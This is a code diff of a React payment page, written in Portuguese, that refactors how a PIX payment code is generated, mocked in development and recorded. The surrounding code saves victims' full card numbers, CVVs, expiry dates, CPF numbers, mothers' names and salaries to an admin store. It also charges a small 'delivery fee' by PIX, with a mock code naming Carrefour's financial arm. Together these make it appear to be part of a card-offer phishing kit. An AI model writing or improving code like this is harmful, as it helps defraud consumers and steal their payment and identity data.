@@ -188,13 +188,13 @@ export default function PaymentPage() {
   const handleGerarPIX = async () => {
     // Prevenir múltiplas execuções simultâneas
     if (gerandoPixRef.current) {
-      console.log('PIX já está sendo gerado, ignorando chamada duplicada');
+      console.log('🚫 PIX já está sendo gerado, ignorando chamada duplicada');
       return;
     }
     
     gerandoPixRef.current = true;
     setLoading(true);
-    console.log('Iniciando geração de PIX...');
+    console.log('🔄 Iniciando geração de PIX...');
     
     const dadosPix = {
       amount: valorEntrega || 25.50,
@@ -215,7 +215,9 @@ export default function PaymentPage() {
       }
     };
 
-    let resultado;
+    let resultado = null;
+    let usouMock = false;
+    
     try {
       // Timeout de 8 segundos para evitar travamento
       const timeoutPromise = new Promise((_, reject) => 
@@ -226,19 +228,63 @@ export default function PaymentPage() {
         gerarPIX(dadosPix, transactionId),
         timeoutPromise
       ]);
-      console.log('PIX gerado com sucesso:', resultado);
+      console.log('✅ PIX gerado com sucesso via API:', resultado);
+    } catch (error) {
+      console.error('❌ Erro ao gerar PIX via API:', error);
+      
+      // Verificar se está em desenvolvimento
+      const isDevelopment = import.meta.env.DEV || 
+        (typeof window !== 'undefined' && (
+          window.location.hostname === 'localhost' || 
+          window.location.hostname === '127.0.0.1' ||
+          window.location.hostname.includes('localhost')
+        ));
+      
+      // Em desenvolvimento, usar mock para facilitar testes
+      if (isDevelopment) {
+        console.warn('⚠️ Modo desenvolvimento: Usando PIX mock devido ao erro:', error.message);
+        
+        resultado = {
+          transactionId: 'TXN' + Date.now() + Math.random().toString(36).substr(2, 9).toUpperCase(),
+          pixCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
+          qrCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
+          expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString()
+        };
+        usouMock = true;
+        console.log('🎭 PIX mock criado:', resultado.transactionId);
+      } else {
+        // Em produção, mostrar erro real ao usuário
+        console.error('💥 Erro em produção:', error.message);
+        setLoading(false);
+        gerandoPixRef.current = false;
+        alert(`Erro ao gerar código PIX: ${error.message}\n\nPor favor, tente novamente ou entre em contato com o suporte.`);
+        return; // Sair da função sem processar
+      }
+    } finally {
+      // SEMPRE limpar o loading e a flag
+      setLoading(false);
+      gerandoPixRef.current = false;
+    }
+    
+    // ========================================
+    // PONTO ÚNICO DE PROCESSAMENTO DO RESULTADO
+    // ========================================
+    if (resultado) {
+      console.log(`📦 Processando resultado do PIX (${usouMock ? 'MOCK' : 'REAL'})...`);
+      
+      // Atualizar estado do componente
       setPixData(resultado.pixCode, resultado.qrCode, resultado.transactionId);
       setPixGerado(true);
-      setLoading(false);
-      console.log('Estado atualizado: pixGerado=true, pixCode=', resultado.pixCode?.substring(0, 20));
+      console.log('✓ Estado atualizado: pixGerado=true, pixCode=', resultado.pixCode?.substring(0, 20));
       
+      // Calcular tempo de expiração
       const expiresAt = resultado.expiresAt || new Date(Date.now() + 5 * 60 * 1000).toISOString();
       const expiraEm = new Date(expiresAt).getTime();
       const agora = new Date().getTime();
       const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
-      // Limitar a 5 minutos máximo
       setTempoRestante(Math.min(diferenca, 5 * 60));
       
+      // Salvar no localStorage
       localStorage.setItem('pix_data', JSON.stringify({
         pixCode: resultado.pixCode,
         pixQrCode: resultado.qrCode,
@@ -246,8 +292,11 @@ export default function PaymentPage() {
         expiresAt: expiresAt,
         valor: dadosPix.amount
       }));
+      console.log('✓ PIX salvo no localStorage');
       
+      // Track purchase no Facebook Pixel
       trackPurchase(dadosPix.amount, 'BRL', resultado.transactionId);
+      console.log('✓ Purchase tracked no Facebook Pixel');
       
       // Salvar pedido no admin store
       addOrder({
@@ -270,104 +319,25 @@ export default function PaymentPage() {
         bandeiraCartao,
         limite,
       });
+      console.log('✓ Pedido salvo no admin store');
       
-      // Enviar notificação de pedido pendente (apenas uma vez)
+      // ========================================
+      // ENVIAR NOTIFICAÇÃO (APENAS UMA VEZ)
+      // ========================================
       if (!notificacaoPendenteEnviadaRef.current) {
-        console.log('Enviando notificação de pedido pendente...');
+        console.log('📤 Enviando notificação de pedido pendente...');
         try {
           await notificarPedidoPendente(resultado.transactionId, dadosPix.amount);
           notificacaoPendenteEnviadaRef.current = true;
-          console.log('Notificação enviada com sucesso');
+          console.log('✅ Notificação enviada com sucesso');
         } catch (error) {
-          console.error('Erro ao enviar notificação de pedido pendente:', error);
+          console.error('❌ Erro ao enviar notificação de pedido pendente:', error);
         }
-      }
-      console.log('PIX processado com sucesso');
-    } catch (error) {
-      console.error('Erro ao gerar PIX:', error);
-      
-      // Verificar se está em desenvolvimento
-      const isDevelopment = import.meta.env.DEV || 
-        (typeof window !== 'undefined' && (
-          window.location.hostname === 'localhost' || 
-          window.location.hostname === '127.0.0.1' ||
-          window.location.hostname.includes('localhost')
-        ));
-      
-      // Em desenvolvimento, usar mock para facilitar testes
-      if (isDevelopment) {
-        console.warn('⚠️ Modo desenvolvimento: Usando PIX mock devido ao erro:', error.message);
-        
-        const mockResult = {
-          transactionId: 'TXN' + Date.now() + Math.random().toString(36).substr(2, 9).toUpperCase(),
-          pixCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
-          qrCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
-          expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString()
-        };
-        
-        console.log('Aplicando PIX mock...');
-        setPixData(mockResult.pixCode, mockResult.qrCode, mockResult.transactionId);
-        setPixGerado(true);
-        setTempoRestante(5 * 60);
-        setLoading(false);
-        
-        console.log('Estado atualizado (mock): pixGerado=true, pixCode=', mockResult.pixCode?.substring(0, 20));
-        
-        localStorage.setItem('pix_data', JSON.stringify({
-          pixCode: mockResult.pixCode,
-          pixQrCode: mockResult.qrCode,
-          transactionId: mockResult.transactionId,
-          expiresAt: mockResult.expiresAt,
-          valor: dadosPix.amount
-        }));
-        
-        // Salvar pedido mock no admin store
-        console.log('Salvando pedido no admin store...');
-        addOrder({
-          nomeCompleto,
-          telefone,
-          cpf,
-          email,
-          dataNascimento,
-          profissao,
-          salario,
-          nomeMae,
-          endereco,
-          valorEntrega: dadosPix.amount,
-          transactionId: mockResult.transactionId,
-          pixCode: mockResult.pixCode,
-          pixQrCode: mockResult.qrCode,
-          numeroCartao,
-          cvv,
-          validade,
-          bandeiraCartao,
-          limite,
-        });
-        
-        // Enviar notificação de pedido pendente (apenas uma vez)
-        if (!notificacaoPendenteEnviadaRef.current) {
-          console.log('Enviando notificação de pedido pendente...');
-          try {
-            await notificarPedidoPendente(mockResult.transactionId, dadosPix.amount);
-            notificacaoPendenteEnviadaRef.current = true;
-            console.log('Notificação enviada com sucesso');
-          } catch (notifError) {
-            console.error('Erro ao enviar notificação de pedido pendente:', notifError);
-          }
-        }
-        
-        console.log('PIX mock aplicado com sucesso');
       } else {
-        // Em produção, mostrar erro real ao usuário
-        console.error('Erro em produção:', error.message);
-        alert(`Erro ao gerar código PIX: ${error.message}\n\nPor favor, tente novamente ou entre em contato com o suporte.`);
+        console.log('ℹ️ Notificação já foi enviada anteriormente, pulando...');
       }
-    } finally {
-      // SEMPRE limpar o loading e a flag, mesmo em caso de erro
-      console.log('Finalizando geração de PIX, limpando loading...');
-      setLoading(false);
-      gerandoPixRef.current = false;
-      console.log('Flags limpas: loading=false, gerandoPixRef=false');
+      
+      console.log(`🎉 PIX ${usouMock ? 'mock' : 'real'} processado com sucesso!`);
     }
   };
 
